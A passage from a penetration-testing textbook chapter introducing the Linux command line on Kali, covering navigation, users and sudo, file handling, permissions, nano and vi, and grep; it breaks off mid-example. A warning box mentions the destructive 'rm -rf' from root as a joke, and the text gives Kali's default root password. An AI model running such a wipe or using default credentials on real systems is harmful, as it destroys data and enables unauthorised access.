<html><head></head><body><section class="chapter" epub:type="chapter" id="using_kali_linux" title="Chapter&#xA0;2.&#xA0;Using Kali Linux"><div class="titlepage"><div><div><h2 class="title">Chapter 2. Using Kali Linux</h2></div></div></div><p><a class="indexterm" id="iddle1094"/><a class="indexterm" id="iddle1585"/><a class="indexterm" id="iddle1617"/>You will use Kali Linux as the attack platform throughout this book. Kali, the successor to the popular BackTrack Linux, is a Debian-based distribution that comes with a plethora of penetration testing tools preinstalled and preconfigured. Anyone who’s ever tried to set up a pentesting box from scratch the day before a big engagement knows that getting everything working correctly can be a real pain. Having everything preconfigured in Kali can save a lot of time and headaches. Kali Linux works just like the standard Debian GNU/Linux distribution, with a lot of extra tools.</p><p>Rather than point and click your way through Kali, you’ll use the Linux command line because that’s where the real power lies. In this chapter we’ll look at how to perform some common Linux tasks from the command line. If you’re already a Linux expert, you can skip this chapter and move on to <a class="xref" href="ch03.xhtml" title="Chapter 3. Programming">Chapter 3</a>; if not, take some time and dive in.</p><div class="sect1" title="Linux Command Line"><div class="titlepage"><div><div><h2 class="title" id="linux_command_line" style="clear: both">Linux Command Line</h2></div></div></div><p><a class="indexterm" id="iddle1014"/><a class="indexterm" id="iddle1096"/><a class="indexterm" id="iddle1171"/><a class="indexterm" id="iddle1271"/><a class="indexterm" id="iddle1273"/><a class="indexterm" id="iddle1587"/><a class="indexterm" id="iddle1621"/><a class="indexterm" id="iddle1645"/><a class="indexterm" id="iddle2019"/><a class="indexterm" id="iddle2052"/><a class="indexterm" id="iddle2083"/><a class="indexterm" id="iddle2086"/>The Linux command line looks like this:</p><a id="pro_id00017"/><pre class="programlisting">root@kali:~#</pre><p>Like a DOS prompt or the Mac OS terminal, the Linux command line gives you access to a command processor called Bash that allows you to control the system by entering text-based instructions. When you open the command line you’ll see the prompt <code class="literal">root@kali#</code>. <span class="emphasis"><em>Root</em></span> is the superuser on Linux systems, and it has complete control of Kali.</p><p>To perform operations in Linux, you enter commands along with any relevant options. For example, to view the contents of root’s home directory, enter the command <span class="strong"><strong><code class="literal">ls</code></strong></span> as shown here.</p><a id="pro_id00018"/><pre class="programlisting">root@kali:~# <span class="strong"><strong>ls</strong></span>&#13;
Desktop</pre><p>As you can see, there’s not much in the root directory, only a folder called <span class="emphasis"><em>Desktop</em></span>.</p></div><div class="sect1" title="The Linux Filesystem"><div class="titlepage"><div><div><h2 class="title" id="linux_filesystem" style="clear: both">The Linux Filesystem</h2></div></div></div><p>In the Linux world, everything is a file: keyboards, printers, network devices—everything. All files can be viewed, edited, deleted, created, and moved. The Linux filesystem is made up of a series of directories that branch off from the root of the filesystem (<code class="literal">/</code>).</p><p>To see your current directory, enter <span class="strong"><strong><code class="literal">pwd</code></strong></span> at the terminal:</p><a id="pro_id00019"/><pre class="programlisting">root@kali:~# <span class="strong"><strong>pwd</strong></span>&#13;
/root</pre><div class="sect2" title="Changing Directories"><div class="titlepage"><div><div><h3 class="title" id="changing_directories">Changing Directories</h3></div></div></div><p>To move to another directory, enter <code class="literal">cd</code> <span class="emphasis"><em><code class="literal">directory</code></em></span> using either the absolute or relative path to the new directory, based your current location. The <span class="emphasis"><em>absolute path</em></span> is the path to a file in relation to the root directory (<code class="literal">/</code>). For example, to change to your desktop from anywhere, you could enter the absolute path to the desktop with <code class="literal">cd /root/Desktop</code> to reach the root user’s desktop. If you were in the directory <span class="emphasis"><em>/root</em></span> (the root user’s home directory), you could use the <span class="emphasis"><em>relative path</em></span> to the desktop (that is, relative to your current location) by entering <code class="literal">cd Desktop</code>, which would also take you to the desktop.</p><p>The command <code class="literal">cd ..</code> takes you back one level in the filesystem, as shown here.</p><a id="pro_id00020"/><pre class="programlisting">root@kali:~/Desktop# <span class="strong"><strong>cd ..</strong></span>&#13;
root@kali:~/# <span class="strong"><strong>cd ../etc</strong></span>&#13;
root@kali:/etc#</pre><p><a class="indexterm" id="iddle1194"/><a class="indexterm" id="iddle1278"/><a class="indexterm" id="iddle1476"/><a class="indexterm" id="iddle1646"/><a class="indexterm" id="iddle1664"/><a class="indexterm" id="iddle1665"/>Entering <code class="literal">cd ..</code> from root’s <span class="emphasis"><em>Desktop</em></span> directory takes us back to root’s home directory. Entering <code class="literal">cd ../etc</code> from there moves us back up to the root of the filesystem and then to the <span class="emphasis"><em>/etc</em></span> directory.</p></div></div><div class="sect1" title="Learning About Commands: The Man Pages"><div class="titlepage"><div><div><h2 class="title" id="learning_about_commands_the_man_pages" style="clear: both">Learning About Commands: The Man Pages</h2></div></div></div><p>To learn more about a command and its options and arguments, you can view its documentation (called its <span class="emphasis"><em>manual page</em></span>, or <span class="emphasis"><em>man page</em></span>) by entering <code class="literal">man</code> <span class="emphasis"><em><code class="literal">command</code></em></span>. For example, to learn more about the <code class="literal">ls</code> command enter <span class="strong"><strong><code class="literal">man ls</code></strong></span> as shown in <a class="xref" href="ch02.xhtml#linux_man_page" title="Example 2-1. Linux man page">Example 2-1</a>.</p><div class="example"><a id="linux_man_page"/><div class="example-title">Example 2-1. Linux man page</div><div class="example-contents"><pre class="programlisting">root@kali:~# <span class="strong"><strong>man ls</strong></span>&#13;
&#13;
LS(1)                            User Commands                           LS(1)&#13;
&#13;
NAME&#13;
       ls - list directory contents&#13;
&#13;
SYNOPSIS&#13;
       ls [OPTION]... [FILE]... ❶&#13;
&#13;
DESCRIPTION ❷&#13;
       List  information  about  the FILEs (the current directory by default).&#13;
       Sort entries alphabetically if none of -cftuvSUX nor --sort  is  speci-&#13;
       fied.&#13;
&#13;
       Mandatory  arguments  to  long  options are mandatory for short options&#13;
       too.&#13;
&#13;
       -a, --all ❸&#13;
              do not ignore entries starting with .&#13;
&#13;
       -A, --almost-all&#13;
              do not list implied . and ..&#13;
--<span class="emphasis"><em>snip</em></span>--&#13;
       -l     use a long listing format&#13;
--<span class="emphasis"><em>snip</em></span>--</pre></div></div><p>The man page gives useful (if a bit unfriendly looking) information about the <code class="literal">ls</code> command including its usage ❶, description ❷, and available options ❸.</p><p>As you can see in the description section at ❷, the <code class="literal">ls</code> command lists all files in the current working directory by default, but you can also use <code class="literal">ls</code> to get information about a particular file. For example, according to the man page you can use the <code class="literal">-a</code> option with <code class="literal">ls</code> to show all files, including <span class="emphasis"><em>hidden directories</em></span>—directories not shown in the default <code class="literal">ls</code> listing—as shown in <a class="xref" href="ch02.xhtml#using_an_option_with_ls" title="Example 2-2. Using an option with ls">Example 2-2</a>.</p><div class="example"><a id="using_an_option_with_ls"/><div class="example-title">Example 2-2. Using an option with <code class="literal">ls</code></div><div class="example-contents"><pre class="programlisting">root@kali:~# <span class="strong"><strong>ls -a</strong></span>&#13;
.                         .mozilla&#13;
..                        .msf4&#13;
.android                  .mysql_history&#13;
.bash_history             .nano_history&#13;
--<span class="emphasis"><em>snip</em></span>--</pre></div></div><p><a class="indexterm" id="iddle1018"/><a class="indexterm" id="iddle1596"/><a class="indexterm" id="iddle2197"/><a class="indexterm" id="iddle2334"/><a class="indexterm" id="iddle2339"/><a class="indexterm" id="iddle2344"/>As you can see, there are several hidden directories in the root directory, all of which are preceded by a period (<code class="literal">.</code>) character. (In <a class="xref" href="ch08.xhtml" title="Chapter 8. Exploitation">Chapter 8</a>, we’ll see how these sometimes-hidden directories can lead to a system compromise.) You can also see the entries <code class="literal">.</code> and <code class="literal">..</code>, which denote the current directory and the parent directory, respectively.</p></div><div class="sect1" title="User Privileges"><div class="titlepage"><div><div><h2 class="title" id="user_privileges" style="clear: both">User Privileges</h2></div></div></div><p>Linux user accounts offer resources to a particular individual or service. A user may log in with a password and be offered certain resources on the Linux system, such as the ability to write files and browse the Internet. That user may not be able to see files that belong to other users and can have reasonable assurance that other users can’t see his or her files either. In addition to traditional user accounts used by a person who logs in with a password and accesses the system, Linux systems can allow software to have a user account. The software can have the ability to use system resources to do its job, but it cannot read other users’ private files. The accepted best practice on Linux systems is to run day-to-day commands as an unprivileged user account instead of running everything as the privileged root user to avoid inadvertently harming your system or granting excessive privilege to the commands and applications you run.</p><div class="sect2" title="Adding a User"><div class="titlepage"><div><div><h3 class="title" id="adding_a_user">Adding a User</h3></div></div></div><p>By default, Kali offers only the privileged root account. Though many security tools require root privileges to run, you may want to add another unprivileged account for everyday use to reduce the potential for damage to your system. Remember, the root account can do anything on Linux, including corrupting all of your files.</p><p>To add a new user <span class="emphasis"><em>georgia</em></span> to your Kali system use the <code class="literal">adduser</code> command, as shown in <a class="xref" href="ch02.xhtml#adding_a_new_user" title="Example 2-3. Adding a new user">Example 2-3</a>.</p><div class="example"><a id="adding_a_new_user"/><div class="example-title">Example 2-3. Adding a new user</div><div class="example-contents"><pre class="programlisting">root@kali:~# <span class="strong"><strong>adduser georgia</strong></span>&#13;
Adding user `georgia' ...&#13;
Adding new group `georgia' (1000) ...&#13;
Adding new user `georgia' (1000) with group `georgia' ... ❶&#13;
Creating home directory `/home/georgia' ... ❷&#13;
Copying files from `/etc/skel' ...&#13;
Enter new UNIX password: ❸&#13;
Retype new UNIX password:&#13;
passwd: password updated successfully&#13;
Changing the user information for georgia&#13;
Enter the new value, or press ENTER for the default&#13;
      Full Name []: <span class="strong"><strong>Georgia Weidman</strong></span> ❹&#13;
      Room Number []:&#13;
      Work Phone []:&#13;
      Home Phone []:&#13;
      Other []:&#13;
Is the information correct? [Y/n] <span class="strong"><strong>Y</strong></span></pre></div></div><p><a class="indexterm" id="iddle1991"/><a class="indexterm" id="iddle2267"/><a class="indexterm" id="iddle2268"/><a class="indexterm" id="iddle2269"/><a class="indexterm" id="iddle2336"/><a class="indexterm" id="iddle2341"/>As you can see, in addition to adding a user to the system, a group <span class="emphasis"><em>georgia</em></span> is created, a new user is added to this group ❶, a home directory is created for the user ❷, and the system prompts for information about the user, such as a password ❸ and the user’s full name ❹.</p></div><div class="sect2" title="Adding a User to the sudoers File"><div class="titlepage"><div><div><h3 class="title" id="adding_a_user_to_the_sudoers_file">Adding a User to the sudoers File</h3></div></div></div><p>When you need to do something that requires root privileges as a regular user, use the <code class="literal">sudo</code> command along with the command that you want to run as root, and then enter your password. For the newly created user <span class="emphasis"><em>georgia</em></span> to be able to run privileged commands you need to add her to the <span class="emphasis"><em>sudoers</em></span> file, which specifies which users can use the <code class="literal">sudo</code> command. To do so, enter <span class="strong"><strong><code class="literal">adduser</code></strong></span> <span class="bolditalic"><code class="literal">username</code></span> <span class="strong"><strong><code class="literal">sudo</code></strong></span> as shown here.</p><a id="pro_id00021"/><pre class="programlisting">root@kali:~# <span class="strong"><strong>adduser georgia sudo</strong></span>&#13;
Adding user 'georgia' to group `sudo' ...&#13;
Adding user georgia to group sudo&#13;
Done.</pre></div><div class="sect2" title="Switching Users and Using sudo"><div class="titlepage"><div><div><h3 class="title" id="switching_users_and_using_sudo">Switching Users and Using sudo</h3></div></div></div><p>To switch users in your terminal session, say from the root user to <span class="emphasis"><em>georgia</em></span>, use the <code class="literal">su</code> command as shown in <a class="xref" href="ch02.xhtml#switching_to_a_different_user" title="Example 2-4. Switching to a different user">Example 2-4</a>.</p><div class="example"><a id="switching_to_a_different_user"/><div class="example-title">Example 2-4. Switching to a different user</div><div class="example-contents"><pre class="programlisting">root@kali:~# <span class="strong"><strong>su georgia</strong></span>&#13;
georgia@kali:/root$ <span class="strong"><strong>adduser john</strong></span>&#13;
bash: adduser: command not found ❶&#13;
georgia@kali:/root$ <span class="strong"><strong>sudo adduser john</strong></span>&#13;
[sudo] password for georgia:&#13;
Adding user `john' ... ❷&#13;
Adding new group `john' (1002) ...&#13;
Adding new user `john' (1002) with group `john' ...&#13;
<span class="emphasis"><em>--snip--</em></span>&#13;
georgia@kali:/root$ su&#13;
Password:&#13;
root@kali:~#</pre></div></div><p><a class="indexterm" id="iddle1207"/><a class="indexterm" id="iddle1209"/><a class="indexterm" id="iddle1259"/><a class="indexterm" id="iddle1272"/><a class="indexterm" id="iddle1398"/><a class="indexterm" id="iddle1399"/><a class="indexterm" id="iddle1730"/><a class="indexterm" id="iddle1755"/><a class="indexterm" id="iddle1786"/><a class="indexterm" id="iddle2060"/><a class="indexterm" id="iddle2081"/><a class="indexterm" id="iddle2312"/>You switch users with the <code class="literal">su</code> command. If you try to run commands (such as the <code class="literal">adduser</code> command) that require more privileges than the current user (<span class="emphasis"><em>georgia</em></span>), the command is unsuccessful (<code class="literal">command not found</code>) ❶ because you can run the <code class="literal">adduser</code> command only as root.</p><p>Luckily, as discussed previously, you can use the <code class="literal">sudo</code> command to run a command as root. Because the <span class="emphasis"><em>georgia</em></span> user is a member of the <code class="literal">sudo</code> group, you can run privileged commands, and you can see user <span class="emphasis"><em>john</em></span> is added ❷ to the system.</p><p>To change back to the root user, enter the <code class="literal">su</code> command with no username. You will be prompted for the root’s password (<span class="emphasis"><em>toor</em></span>).</p></div><div class="sect2" title="Creating a New File or Directory"><div class="titlepage"><div><div><h3 class="title" id="creating_a_new_file_or_directory">Creating a New File or Directory</h3></div></div></div><p>To create a new, empty file called <span class="emphasis"><em>myfile</em></span>, use the <code class="literal">touch</code> command.</p><a id="pro_id00022"/><pre class="programlisting">root@kali:# <span class="strong"><strong>touch myfile</strong></span></pre><p>To create a new directory in your current working directory, enter <span class="strong"><strong><code class="literal">mkdir</code></strong></span> <span class="bolditalic"><code class="literal">directory</code></span> as shown here.</p><a id="pro_id00023"/><pre class="programlisting">root@kali:~# <span class="strong"><strong>mkdir mydirectory</strong></span>&#13;
root@kali:~# <span class="strong"><strong>ls</strong></span>&#13;
 Desktop               mydirectory        myfile&#13;
root@kali:~# <span class="strong"><strong>cd mydirectory/</strong></span></pre><p>Use <span class="strong"><strong><code class="literal">ls</code></strong></span> to confirm that the new directory has been created, and then change to <span class="emphasis"><em>mydirectory</em></span> using <span class="strong"><strong><code class="literal">cd</code></strong></span>.</p></div><div class="sect2" title="Copying, Moving, and Removing Files"><div class="titlepage"><div><div><h3 class="title" id="copyingcomma_movingcomma_and_removing_fi">Copying, Moving, and Removing Files</h3></div></div></div><p>To copy a file, use the <code class="literal">cp</code> command as shown here.</p><a id="pro_id00024"/><pre class="programlisting">root@kali:/mydirectory# <span class="strong"><strong>cp /root/myfile myfile2</strong></span></pre><p>The syntax is <code class="literal">cp</code> <span class="emphasis"><em><code class="literal">source destination</code></em></span>. When using <code class="literal">cp</code>, the original file is left in place, and a copy is made at the desired destination.</p><p>Similarly, you can move a file from one location to another using the <code class="literal">mv</code> command. The syntax is identical to <code class="literal">cp</code>, but this time the file is removed from the source location.</p><p>You can remove a file from the filesystem by entering <code class="literal">rm</code> <span class="emphasis"><em><code class="literal">file</code></em></span>. To remove files recursively use the <code class="literal">-r</code> command.</p><div class="warning" epub:type="warning" title="Warning"><h3 class="title"><a id="ch02note01"/>Warning</h3><p>Be careful when removing files, particularly recursively! Some hackers joke that the first command to teach Linux beginners is <code class="literal">rm -rf</code> from the root directory, which forcibly deletes the entire filesystem. This teaches new users the power of performing actions as root. Don’t try that at home!</p></div></div><div class="sect2" title="Adding Text to a File"><div class="titlepage"><div><div><h3 class="title" id="adding_text_to_a_file">Adding Text to a File</h3></div></div></div><p><a class="indexterm" id="iddle1008"/><a class="indexterm" id="iddle1009"/><a class="indexterm" id="iddle1066"/><a class="indexterm" id="iddle1168"/><a class="indexterm" id="iddle1310"/><a class="indexterm" id="iddle1395"/><a class="indexterm" id="iddle1397"/><a class="indexterm" id="iddle1516"/><a class="indexterm" id="iddle2046"/><a class="indexterm" id="iddle2101"/><a class="indexterm" id="iddle2290"/>The <code class="literal">echo</code> command echoes what you enter to the terminal, as shown here.</p><a id="pro_id00025"/><pre class="programlisting">root@kali:/mydirectory# <span class="strong"><strong>echo hello georgia</strong></span>&#13;
hello georgia</pre><p>To save text to a file, you can redirect your input to a file instead of to the terminal with the <code class="literal">&gt;</code> symbol.</p><a id="pro_id00026"/><pre class="programlisting">root@kali:/mydirectory# <span class="strong"><strong>echo hello georgia &gt; myfile</strong></span></pre><p>To see the contents of your new file you can use the <code class="literal">cat</code> command.</p><a id="pro_id00027"/><pre class="programlisting">root@kali:/mydirectory# <span class="strong"><strong>cat myfile</strong></span>&#13;
hello georgia</pre><p>Now echo a different line of text into <span class="emphasis"><em>myfile</em></span> as shown next.</p><a id="pro_id00028"/><pre class="programlisting">root@kali:# <span class="strong"><strong>echo hello georgia again &gt; myfile</strong></span>&#13;
root@kali:/mydirectory# <span class="strong"><strong>cat myfile</strong></span>&#13;
hello georgia again</pre><p>The <code class="literal">&gt;</code> overwrites the previous contents of the file. If you echo another line into <span class="emphasis"><em>myfile</em></span>, that new line overwrites the output of the previous command. As you can see, the contents of <span class="emphasis"><em>myfile</em></span> now reads <span class="emphasis"><em>hello georgia again</em></span>.</p></div><div class="sect2" title="Appending Text to a File"><div class="titlepage"><div><div><h3 class="title" id="appending_text_to_a_file">Appending Text to a File</h3></div></div></div><p>To append text to a file, use <code class="literal">&gt;&gt;</code> as shown here.</p><a id="pro_id00029"/><pre class="programlisting">root@kali:/mydirectory# <span class="strong"><strong>echo hello georgia a third time &gt;&gt; myfile</strong></span>&#13;
root@kali:/mydirectory# <span class="strong"><strong>cat myfile</strong></span>&#13;
hello georgia again&#13;
hello georgia a third time</pre><p>As you can see, appending preserves the previous contents of the file.</p></div></div><div class="sect1" title="File Permissions"><div class="titlepage"><div><div><h2 class="title" id="file_permissions" style="clear: both">File Permissions</h2></div></div></div><p>If you look at the long output of <code class="literal">ls -l</code> on <span class="emphasis"><em>myfile</em></span>, you can see the current permissions for <span class="emphasis"><em>myfile</em></span>.</p><a id="pro_id00030"/><pre class="programlisting">root@kali:~/mydirectory# <span class="strong"><strong>ls -l myfile</strong></span>&#13;
-rw-r--r-- 1 root root 47 Apr 23 21:15 myfile</pre><p>From left to right you see the file type and permissions (<code class="literal">-rw-r—r--</code>), the number of links to the file (1), the user and group that own the file (root), the file size (47 bytes), the last time the file was edited (April 23, 21:15), and finally the filename (<span class="emphasis"><em>myfile</em></span>).</p><p><a class="indexterm" id="iddle1035"/><a class="indexterm" id="iddle1177"/><a class="indexterm" id="iddle1315"/><a class="indexterm" id="iddle1352"/><a class="indexterm" id="iddle1400"/><a class="indexterm" id="iddle1454"/><a class="indexterm" id="iddle1790"/><a class="indexterm" id="iddle1873"/><a class="indexterm" id="iddle2044"/><a class="indexterm" id="iddle2368"/><a class="indexterm" id="iddle2530"/>Linux files have permissions to read (<code class="literal">r</code>), write (<code class="literal">w</code>), and execute (<code class="literal">x</code>) and three sets of user permissions: permissions for the owner, the group, and all users. The first three letters denote the permissions for the owner, the following three denote the permissions for the group, and the final three denote the permissions for all users. Since you created <span class="emphasis"><em>myfile</em></span> from the root user account, the file is owned by user <span class="emphasis"><em>root</em></span> and group <span class="emphasis"><em>root</em></span>, as you can see in the output with <code class="literal">root root</code>. User root has read and write permissions for the file (<code class="literal">rw</code>). Other users in the group, if there are any, can read the file (<code class="literal">r</code>) but not write to or execute it. The last <code class="literal">r</code> shows that all users on the filesystem can read the file.</p><p>To change permissions on a file, use the <code class="literal">chmod</code> command. You can use <code class="literal">chmod</code> to specify permissions for the owner, the group, and the world. When specifying permissions use the numbers from 0 through 7 as shown in <a class="xref" href="ch02.xhtml#linux_file_permissions" title="Table 2-1. Linux File Permissions">Table 2-1</a>.</p><div class="table"><a id="linux_file_permissions"/><div class="table-title">Table 2-1. Linux File Permissions</div><div class="table-contents"><table style="border-collapse: collapse; border-top: 0.5pt solid ; border-bottom: 0.5pt solid ; border-left: 0.5pt solid ; border-right: 0.5pt solid ; "><colgroup><col class="c1"/><col class="c2"/><col class="c3"/></colgroup><thead><tr><td style="vertical-align: top; border-right: 0.5pt solid ; border-bottom: 0.5pt solid ; "><p>Integer Value</p></td><td style="vertical-align: top; border-right: 0.5pt solid ; border-bottom: 0.5pt solid ; "><p>Permissions</p></td><td style="vertical-align: top; border-bottom: 0.5pt solid ; "><p>Binary Representation</p></td></tr></thead><tbody><tr><td style="vertical-align: top; border-right: 0.5pt solid ; border-bottom: 0.5pt solid ; "><p>7</p></td><td style="vertical-align: top; border-right: 0.5pt solid ; border-bottom: 0.5pt solid ; "><p>full</p></td><td style="vertical-align: top; border-bottom: 0.5pt solid ; "><p>111</p></td></tr><tr><td style="vertical-align: top; border-right: 0.5pt solid ; border-bottom: 0.5pt solid ; "><p>6</p></td><td style="vertical-align: top; border-right: 0.5pt solid ; border-bottom: 0.5pt solid ; "><p>read and write</p></td><td style="vertical-align: top; border-bottom: 0.5pt solid ; "><p>110</p></td></tr><tr><td style="vertical-align: top; border-right: 0.5pt solid ; border-bottom: 0.5pt solid ; "><p>5</p></td><td style="vertical-align: top; border-right: 0.5pt solid ; border-bottom: 0.5pt solid ; "><p>read and execute</p></td><td style="vertical-align: top; border-bottom: 0.5pt solid ; "><p>101</p></td></tr><tr><td style="vertical-align: top; border-right: 0.5pt solid ; border-bottom: 0.5pt solid ; "><p>4</p></td><td style="vertical-align: top; border-right: 0.5pt solid ; border-bottom: 0.5pt solid ; "><p>read only</p></td><td style="vertical-align: top; border-bottom: 0.5pt solid ; "><p>100</p></td></tr><tr><td style="vertical-align: top; border-right: 0.5pt solid ; border-bottom: 0.5pt solid ; "><p>3</p></td><td style="vertical-align: top; border-right: 0.5pt solid ; border-bottom: 0.5pt solid ; "><p>write and execute</p></td><td style="vertical-align: top; border-bottom: 0.5pt solid ; "><p>011</p></td></tr><tr><td style="vertical-align: top; border-right: 0.5pt solid ; border-bottom: 0.5pt solid ; "><p>2</p></td><td style="vertical-align: top; border-right: 0.5pt solid ; border-bottom: 0.5pt solid ; "><p>write only</p></td><td style="vertical-align: top; border-bottom: 0.5pt solid ; "><p>010</p></td></tr><tr><td style="vertical-align: top; border-right: 0.5pt solid ; border-bottom: 0.5pt solid ; "><p>1</p></td><td style="vertical-align: top; border-right: 0.5pt solid ; border-bottom: 0.5pt solid ; "><p>execute only</p></td><td style="vertical-align: top; border-bottom: 0.5pt solid ; "><p>001</p></td></tr><tr><td style="vertical-align: top; border-right: 0.5pt solid ; "><p>0</p></td><td style="vertical-align: top; border-right: 0.5pt solid ; "><p>none</p></td><td style="vertical-align: top; "><p>000</p></td></tr></tbody></table></div></div><p>When entering new file permissions, you use one digit for the owner, one for the group, and one for world. For example, to give the owner full permissions but the group and the world no permissions to read, write, or execute a file, use <span class="strong"><strong><code class="literal">chmod 700</code></strong></span> like this:</p><a id="pro_id00031"/><pre class="programlisting">root@kali:~/mydirectory# <span class="strong"><strong>chmod 700 myfile</strong></span>&#13;
root@kali:~/mydirectory# <span class="strong"><strong>ls -l myfile</strong></span>&#13;
-rwx------❶ 1 root root 47 Apr 23 21:15 myfile</pre><p>Now when you run the <code class="literal">ls -l</code> command on <span class="emphasis"><em>myfile</em></span>, you can see that root has read, write, and execute (<code class="literal">rwx</code>) permissions and the other sets are blank ❶. If you try to access the file as any user other than root, you’ll get a permission denied error.</p></div><div class="sect1" title="Editing Files"><div class="titlepage"><div><div><h2 class="title" id="editing_files" style="clear: both">Editing Files</h2></div></div></div><p>Perhaps no debate brings out such passion among Linux users as which is the best file editor. We’ll look at the basics of using two popular editors, vi and nano, beginning with my favorite, nano.</p><a id="pro_id00032"/><pre class="programlisting">root@kali:~/mydirectory# <span class="strong"><strong>nano testfile.txt</strong></span></pre><p><a class="indexterm" id="iddle2114"/><a class="indexterm" id="iddle2291"/><a class="indexterm" id="iddle2369"/>Once in nano you can begin adding text to a new file called <span class="emphasis"><em>testfile.txt</em></span>. When you open nano, you should see a blank file with help information for nano shown at the bottom of the screen, as shown here.</p><a id="pro_id00033"/><pre class="programlisting">                                  [ New File ]&#13;
^G Get Help  ^O WriteOut  ^R Read File ^Y Prev Page ^K Cut Text  ^C Cur Pos&#13;
^X Exit      ^J Justify   ^W Where Is  ^V Next Page ^U UnCut Text^T To Spell</pre><p>To add text to the file, just start typing.</p><div class="sect2" title="Searching for Text"><div class="titlepage"><div><div><h3 class="title" id="searching_for_text">Searching for Text</h3></div></div></div><p>To search for text in a file, use <span class="smaller">ctrl</span>-W, and then enter the text to search for at the search prompt as shown next.</p><a id="pro_id00034"/><pre class="programlisting">--<span class="emphasis"><em>snip</em></span>--&#13;
Search:<span class="strong"><strong>georgia</strong></span>&#13;
^G Get Help  ^Y First Line^T Go To Line^W Beg of ParM-J FullJstifM-B Backwards&#13;
^C Cancel    ^V Last Line ^R Replace   ^O End of ParM-C Case SensM-R Regexp</pre><p>Nano should find the text <span class="emphasis"><em>georgia</em></span> if the word is in the file. To exit, press <span class="smaller">ctrl</span>-X. You will be prompted to save the file or lose the changes, as shown here:</p><a id="pro_id00035"/><pre class="programlisting">--<span class="emphasis"><em>snip</em></span>--&#13;
Save modified buffer (ANSWERING "No" WILL DESTROY CHANGES) ? <span class="strong"><strong>Y</strong></span>&#13;
 Y Yes&#13;
 N No           ^C Cancel</pre><p>Enter <span class="strong"><strong><code class="literal">Y</code></strong></span> to save the file. Now we’ll edit the file with the vi editor.</p></div><div class="sect2" title="Editing a File with vi"><div class="titlepage"><div><div><h3 class="title" id="editing_a_file_with_vi">Editing a File with vi</h3></div></div></div><p>Add the text in <a class="xref" href="ch02.xhtml#editing_files_with_vi" title="Example 2-5. Editing files with vi">Example 2-5</a> to <span class="emphasis"><em>testfile.txt</em></span>. In addition to the contents of the file, at the bottom of the vi screen you see some information including the filename, number of lines, and the current cursor position (see <a class="xref" href="ch02.xhtml#editing_files_with_vi" title="Example 2-5. Editing files with vi">Example 2-5</a>).</p><div class="example"><a id="editing_files_with_vi"/><div class="example-title">Example 2-5. Editing files with vi</div><div class="example-contents"><pre class="programlisting">root@kali:~/mydirectory# <span class="strong"><strong>vi testfile.txt</strong></span>&#13;
hi&#13;
georgia&#13;
we&#13;
are&#13;
teaching&#13;
pentesting&#13;
today&#13;
~&#13;
&#13;
"testfile.txt" 7L, 46C                                        1,1           All</pre></div></div><p><a class="indexterm" id="iddle1246"/><a class="indexterm" id="iddle1518"/><a class="indexterm" id="iddle1588"/>Unlike nano, you can’t just start editing the file once it is opened in vi. To edit a file, enter <span class="strong"><strong><code class="literal">I</code></strong></span> to put vi into insert mode. You should see the word <span class="emphasis"><em>INSERT</em></span> displayed at the bottom of your terminal. Once you’ve finished making changes, press <span class="smaller">esc</span> to exit insert mode and return to command mode. Once in command mode, you can use commands to edit your text. For example, position the cursor at the line <code class="literal">we</code> and enter <span class="strong"><strong><code class="literal">dd</code></strong></span> to delete the word <code class="literal">we</code> from the file.</p><p>To exit vi, enter :<span class="strong"><strong><code class="literal">wq</code></strong></span> to tell vi to write the changes to the file and quit, as shown in <a class="xref" href="ch02.xhtml#saving_changes_in_vi" title="Example 2-6. Saving changes in vi">Example 2-6</a>.</p><div class="example"><a id="saving_changes_in_vi"/><div class="example-title">Example 2-6. Saving changes in vi</div><div class="example-contents"><pre class="programlisting">hi&#13;
georgia&#13;
are&#13;
teaching&#13;
pentesting&#13;
today&#13;
&#13;
:<span class="strong"><strong>wq</strong></span></pre></div></div><div class="note" title="Note"><h3 class="title"><a id="ch02note02"/>Note</h3><p>To learn more about available commands for vi and nano, read the corresponding man pages.</p></div><p>Which editor you use daily is up to you. Throughout this book we’ll use nano to edit files, but feel free to substitute your editor of choice.</p></div></div><div class="sect1" title="Data Manipulation"><div class="titlepage"><div><div><h2 class="title" id="data_manipulation" style="clear: both">Data Manipulation</h2></div></div></div><p>Now for a bit of data manipulation. Enter the text in <a class="xref" href="ch02.xhtml#example_list_for_data_manipulation" title="Example 2-7. Example list for data manipulation">Example 2-7</a> in <span class="emphasis"><em>myfile</em></span> using your desired text editor. The file lists some of my favorite security conferences and the months when they typically happen.</p><div class="example"><a id="example_list_for_data_manipulation"/><div class="example-title">Example 2-7. Example list for data manipulation</div><div class="example-contents"><pre class="programlisting">root@kali:~/mydirectory# <span class="strong"><strong>cat myfile</strong></span>&#13;
1 Derbycon September&#13;
2 Shmoocon January&#13;
3 Brucon September&#13;
4 Blackhat July&#13;
5 Bsides *&#13;
6 HackerHalted October&#13;
7 Hackcon April</pre></div></div><div class="sect2" title="Using grep"><div class="titlepage"><div><div><h3 class="title" id="using_grep">Using grep</h3></div></div></div><p><a class="indexterm" id="iddle1012"/><a class="indexterm" id="iddle1013"/><a class="indexterm" id="iddle1237"/><a class="indexterm" id="iddle1401"/><a class="indexterm" id="iddle1451"/><a class="indexterm" id="iddle1941"/><a class="indexterm" id="iddle2123"/><a class="indexterm" id="iddle2166"/><a class="indexterm" id="iddle2292"/>The command <code class="literal">grep</code> looks for instances of a text string in a file. For example, to search for all instances of the string <span class="emphasis"><em>September</em></span> in our file, enter <span class="strong"><strong><code class="literal">grep</code></strong></span> <span class="strong"><strong><code class="literal">September</code></strong></span> <span class="strong"><strong><code class="literal">myfile</code></strong></span> as follows.</p><a id="pro_id00036"/><pre class="programlisting">root@kali:~/mydirectory# <span class="strong"><strong>grep September myfile</strong></span>&#13;
1 Derbycon September&#13;
3 Brucon September</pre><p>As you can see, <code class="literal">grep</code> tells us that Derbycon and Brucon are in September.</p><p>Now suppose you want only the names of the conferences in September but not the number or the month. You can send the output of <code class="literal">grep</code> to another command for additional processing using a pipe (<code class="literal">|</code>). The <code class="literal">cut</code> command allows you to take each line of input, choose a delimiter, and print specific fields. For example, to get just the names of conferences that run in September you can <code class="literal">grep</code> for the word <span class="emphasis"><em>September</em></span> as you did previously. Next, you pipe (<code class="literal">|</code>) the output to <code class="literal">cut</code>, where you specify a space as the delimiter with the <code class="literal">-d</code> option and say you want the second field with the field (<code class="literal">-f</code>) option, as shown here.</p><a id="pro_id00037"/><pre class="programlisting">root@kali:~/mydirectory# <span class="strong"><strong>grep September myfile | cut -d " " -f 2</strong></span>&#13;
Derbycon&#13;
